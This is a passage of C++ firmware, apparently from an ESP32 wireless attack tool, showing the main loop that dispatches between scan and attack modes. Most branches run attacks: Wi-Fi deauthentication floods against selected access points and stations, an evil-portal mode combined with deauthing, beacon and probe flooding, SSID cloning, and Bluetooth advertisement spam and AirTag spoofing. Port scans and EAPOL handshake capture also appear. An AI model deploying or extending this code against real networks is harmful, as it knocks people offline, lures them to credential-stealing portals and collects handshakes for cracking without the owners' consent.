  (currentScanMode == WIFI_SCAN_STATION) ||
  (currentScanMode == WIFI_SCAN_TARGET_AP) ||
  (currentScanMode == WIFI_SCAN_AP_STA) ||
  (currentScanMode == WIFI_SCAN_PWN) ||
  (currentScanMode == WIFI_SCAN_PINESCAN) ||
  (currentScanMode == WIFI_SCAN_MULTISSID) ||
  (currentScanMode == WIFI_SCAN_DEAUTH) ||
  (currentScanMode == WIFI_SCAN_STATION_WAR_DRIVE) ||
  (currentScanMode == WIFI_SCAN_ALL))
  {
    if (currentTime - initTime >= this->channel_hop_delay * HOP_DELAY)
    {
      initTime = millis();
      channelHop();
    }
  }
  else if (currentScanMode == WIFI_PING_SCAN) {
    this->pingScan();
  }
  else if (currentScanMode == WIFI_PORT_SCAN_ALL) {
    this->portScan(WIFI_PORT_SCAN_ALL);
  }
  else if (currentScanMode == WIFI_SCAN_SIG_STREN) {
    #ifdef HAS_ILI9341
      this->signalAnalyzerLoop(currentTime);
    #endif
  }
  else if ((currentScanMode == WIFI_SCAN_CHAN_ANALYZER) ||
          (currentScanMode == BT_SCAN_ANALYZER)) {
    this->channelAnalyzerLoop(currentTime);
    #ifdef HAS_ILI9341
      if (currentTime - initTime >= this->channel_hop_delay * 1000)
      {
        initTime = millis();
        channelHop();
      }
    #endif
  }
  else if ((currentScanMode == WIFI_SCAN_PACKET_RATE) ||
            (currentScanMode == WIFI_SCAN_RAW_CAPTURE)) {
    this->packetRateLoop(currentTime);
  }
  else if ((currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM) ||
           (currentScanMode == BT_ATTACK_SOUR_APPLE) ||
           (currentScanMode == BT_ATTACK_SPAM_ALL) ||
           (currentScanMode == BT_ATTACK_SAMSUNG_SPAM) ||
           (currentScanMode == BT_ATTACK_GOOGLE_SPAM) ||
           (currentScanMode == BT_ATTACK_FLIPPER_SPAM) ||
           (currentScanMode == BT_SPOOF_AIRTAG)) {
    #ifdef HAS_BT
      if (currentTime - initTime >= 1000) {
        initTime = millis();
        String displayString = "";
        String displayString2 = "";
        displayString.concat("Advertising Data...");
        for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
          displayString2.concat(" ");
        #ifdef HAS_SCREEN
          display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
          display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
          display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
        #endif
      }

      if ((currentScanMode == BT_ATTACK_GOOGLE_SPAM) ||
          (currentScanMode == BT_ATTACK_SPAM_ALL))
        this->executeSwiftpairSpam(Google);

      if ((currentScanMode == BT_ATTACK_SAMSUNG_SPAM) ||
          (currentScanMode == BT_ATTACK_SPAM_ALL))
        this->executeSwiftpairSpam(Samsung);

      if ((currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM) ||
          (currentScanMode == BT_ATTACK_SPAM_ALL))
        this->executeSwiftpairSpam(Microsoft);
        //this->executeSwiftpairSpam(FlipperZero);

      if ((currentScanMode == BT_ATTACK_SOUR_APPLE) ||
          (currentScanMode == BT_ATTACK_SPAM_ALL))
        this->executeSourApple();

      if ((currentScanMode == BT_ATTACK_FLIPPER_SPAM) ||
          (currentScanMode == BT_ATTACK_SPAM_ALL))
        this->executeSwiftpairSpam(FlipperZero);
      
      if (currentScanMode == BT_SPOOF_AIRTAG)
        this->executeSpoofAirtag();

    #endif
  }
  else if (currentScanMode == WIFI_SCAN_WAR_DRIVE) {
    if (currentTime - initTime >= this->channel_hop_delay * HOP_DELAY)
    {
      initTime = millis();
      #ifdef HAS_GPS
        if (gps_obj.getGpsModuleStatus())
          this->executeWarDrive();
      #endif
    }
  }
  else if (currentScanMode == WIFI_SCAN_GPS_DATA) {
    if (currentTime - initTime >= 5000) {
      this->initTime = millis();
      this->RunGPSInfo();
    }
  }
  else if (currentScanMode == GPS_TRACKER) {
    if (currentTime - initTime >= 1000) {
      this->initTime = millis();
      this->RunGPSInfo(true);
    }
  }
  else if (currentScanMode == WIFI_SCAN_GPS_NMEA) {
    if (currentTime - initTime >= 1000) {
      this->initTime = millis();
      this->RunGPSNmea();
    }
  }
  else if (currentScanMode == WIFI_SCAN_EVIL_PORTAL) {
    if (currentTime - initTime >= (this->channel_hop_delay * HOP_DELAY) / 4) {
      initTime = millis();
      if (this->ep_deauth) {
        for (int i = 0; i < access_points->size(); i++) {
          if (access_points->get(i).selected) {
            this->sendDeauthFrame(access_points->get(i).bssid, access_points->get(i).channel);
          }
        }
      }
    }

    if (evil_portal_obj.ap_index > -1)
      this->changeChannel(access_points->get(evil_portal_obj.ap_index).channel);
    
    evil_portal_obj.main(currentScanMode);
  }
  else if (currentScanMode == WIFI_PACKET_MONITOR)
  {
    #ifdef HAS_SCREEN
      #ifdef HAS_ILI9341
        packetMonitorMain(currentTime);
      #endif
    #endif
  }
  else if (currentScanMode == WIFI_SCAN_EAPOL)
  {
    #ifdef HAS_SCREEN
      #ifdef HAS_ILI9341
        eapolMonitorMain(currentTime);
      #endif
    #endif
  }
  else if (currentScanMode == WIFI_SCAN_ACTIVE_EAPOL)
  {
    #ifdef HAS_SCREEN
      eapolMonitorMain(currentTime);
    #endif
  }
  else if (currentScanMode == WIFI_SCAN_ACTIVE_LIST_EAPOL) {
    if (currentTime - initTime >= this->channel_hop_delay * 1000)
    {
      initTime = millis();
      channelHop();
    }
    #ifdef HAS_SCREEN
      eapolMonitorMain(currentTime);
    #endif    
  }
  else if (currentScanMode == WIFI_ATTACK_AUTH) {
    for (int i = 0; i < 55; i++)
      this->sendProbeAttack(currentTime);

    if (currentTime - initTime >= 1000) {
      initTime = millis();
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
      #endif
      packets_sent = 0;
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_BAD_MSG) ||
          (currentScanMode == WIFI_ATTACK_BAD_MSG_TARGETED)) {
    //for (int i = 0; i < 5; i++)
    if (currentTime - initTime >= 200) {
      this->sendBadMsgAttack(currentTime, currentScanMode == WIFI_ATTACK_BAD_MSG);

    
      initTime = millis();
      String displayString = "";
      String displayString2 = "";
      //displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
      #endif
      //packets_sent = 0;
    }
  }
  else if (currentScanMode == WIFI_ATTACK_DEAUTH) {
    for (int i = 0; i < 55; i++)
      this->sendDeauthAttack(currentTime, this->dst_mac);

    if (currentTime - initTime >= 1000) {
      initTime = millis();
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
      #endif
      packets_sent = 0;
    }
  }
  else if (currentScanMode == WIFI_ATTACK_DEAUTH_MANUAL) {
    for (int i = 0; i < 55; i++)
      this->sendDeauthFrame(this->src_mac, this->set_channel, this->dst_mac);

    if (currentTime - initTime >= 1000) {
      initTime = millis();
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
      #endif
      packets_sent = 0;
    }
  }
  else if (currentScanMode == WIFI_ATTACK_DEAUTH_TARGETED) {
    // Loop through each AP
    for (int x = 0; x < access_points->size(); x++) {
      // Only get selected APs
      if (access_points->get(x).selected) {
        AccessPoint cur_ap = access_points->get(x);
        // Loop through each AP's Station
        for (int i = 0; i < cur_ap.stations->size(); i++) {
          // Only get selected Stations
          if (stations->get(cur_ap.stations->get(i)).selected) {
            Station cur_sta = stations->get(cur_ap.stations->get(i));

            // Send deauths for each selected AP's selected Station
            for (int y = 0; y < 25; y++)
              this->sendDeauthFrame(cur_ap.bssid, cur_ap.channel, cur_sta.mac);

            // Display packets sent on screen
            if (currentTime - initTime >= 1000) {
              initTime = millis();
              String displayString = "";
              String displayString2 = "";
              displayString.concat(text18);
              displayString.concat(packets_sent);
              for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
                displayString2.concat(" ");
              #ifdef HAS_SCREEN
                display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
                display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
                display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
              #endif
              packets_sent = 0;
            }
          }
        }
      }
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_MIMIC)) {
    // Need this for loop because getTouch causes ~10ms delay
    // which makes beacon spam less effective
    for (int i = 0; i < access_points->size(); i++) {
      if (access_points->get(i).selected)
        this->broadcastCustomBeacon(currentTime, ssid{access_points->get(i).essid, random(1, 12), {random(256), 
                                                                                                   random(256),
                                                                                                   random(256),
                                                                                                   random(256),
                                                                                                   random(256),
                                                                                                   random(256)}});
    }
      

    if (currentTime - initTime >= 1000)
    {
      initTime = millis();
      //Serial.print("packets/sec: ");
      //Serial.println(packets_sent);
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
      #endif
      packets_sent = 0;
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_BEACON_SPAM))
  {
    // Need this for loop because getTouch causes ~10ms delay
    // which makes beacon spam less effective
    for (int i = 0; i < 55; i++)
      broadcastRandomSSID(currentTime);

    if (currentTime - initTime >= 1000)
    {
      initTime = millis();
      //Serial.print("packets/sec: ");
      //Serial.println(packets_sent);
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
      #endif
      packets_sent = 0;
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_BEACON_LIST)) {
    for (int i = 0; i < ssids->size(); i++)
      this->broadcastCustomBeacon(currentTime, ssids->get(i));

    if (currentTime - initTime >= 1000)
    {
      initTime = millis();
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
      #endif
      packets_sent = 0;
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_AP_SPAM)) {
    for (int i = 0; i < access_points->size(); i++) {
      if (access_points->get(i).selected)
        this->broadcastCustomBeacon(currentTime, access_points->get(i));
    }

    if (currentTime - initTime >= 1000) {
      initTime = millis();
      packets_sent = 0;
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_RICK_ROLL))
  {
    // Need this for loop because getTouch causes ~10ms delay
    // which makes beacon spam less effective
    for (int i = 0; i < 7; i++)
    {
      for (int x = 0; x < (sizeof(rick_roll)/sizeof(char *)); x++)
      {
        broadcastSetSSID(currentTime, rick_roll[x]);
      }
    }

    if (currentTime - initTime >= 1000)
    {
      initTime = millis();
      //Serial.print("packets/sec: ");
      //Serial.println(packets_sent);
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
      #endif
      packets_sent = 0;
    }
  }
  #ifdef HAS_GPS
    else if ((currentScanMode == WIFI_SCAN_OFF))
      if(gps_obj.queue_enabled())
        gps_obj.disable_queue();
  #endif

  if (WiFi.status() == WL_CONNECTED) {
    this->wifi_connected = true;
    this->wifi_initialized = true;
  }
  else {
    this->wifi_connected = false;
  }
}
